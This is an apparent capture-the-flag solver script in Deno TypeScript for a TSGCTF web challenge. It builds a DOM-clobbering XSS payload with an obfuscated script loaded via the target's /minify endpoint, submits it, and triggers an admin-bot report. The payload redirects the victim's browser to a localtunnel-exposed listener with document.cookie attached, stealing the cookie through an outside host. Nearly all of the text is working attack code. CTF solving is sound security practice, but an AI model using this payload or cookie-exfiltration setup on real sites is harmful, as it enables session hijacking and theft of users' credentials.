import localtunnel from "npm:localtunnel@2.0.2";

if (Deno.args.length !== 2) {
  console.error("Specify host and port!");
  Deno.exit(1);
}

const [host, port] = Deno.args;

const localServerPort = parseInt(Deno.env.get("PORT") ?? "3000", 10);

async function getFlag() {
  const serverAbortController = new AbortController();
  const flagPromise = new Promise<string>((resolve, reject) => {
    Deno.serve({
      port: localServerPort,
      signal: serverAbortController.signal,
    }, (req) => {
      const flag = new URL(req.url).searchParams.get("cookie")
      const match = flag?.match(/TSGCTF\{[^\}]*\}/);
      if (match == null) {
        reject(`Invalid flag: request to ${req.url}`);
      } else {
        resolve(match[0]);
      }

      return new Response("hoge");
    });
  });
  const tunnel = await localtunnel({ host:'http://localtunnel.smallkirby.com' ,port: localServerPort });
  console.error(`Tunnel created: ${tunnel.url}`);
  await exploit(tunnel.url);
  console.log(await flagPromise);
  tunnel.close();
  serverAbortController.abort();
}

async function exploit(myServerUrl: string) {
  const payload = `
<img alt="ownerDocument" id="rr">
<img alt="defaultView" id="rrr">
<img alt="location" id="rrrr">
<img alt="cookie" id="rrrrr">
<a href="${myServerUrl}/?" id="rrrrrr"></a>
<script src="/minify?code=rr%5Brr%5Br%3D%5B%2B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5B%5D%3E%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5D%3E%3D%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5D%5Brrr%5Br%5D%5D%5Brrrr%5Br%5D%5D%3Drrrrrr%2Brr%5Brr%5Br%5D%5D%5Brrrrr%5Br%5D%5D"></script>`;
  const response1 = await fetch(`http://${host}:${port}/submit`, {
    method: "POST",
    body: new URLSearchParams({ code: payload }),
  });
  const submitPath = new URL(response1.url).pathname;
  await fetch(`http://${host}:${port}/report`, {
    method: "POST",
    body: new URLSearchParams({ path: submitPath }),
  });
}

const deathTimer = setTimeout(() => {
  Deno.exit(1);
}, 30 * 1000);

await getFlag();
clearTimeout(deathTimer);
setTimeout(() => {}, 500);
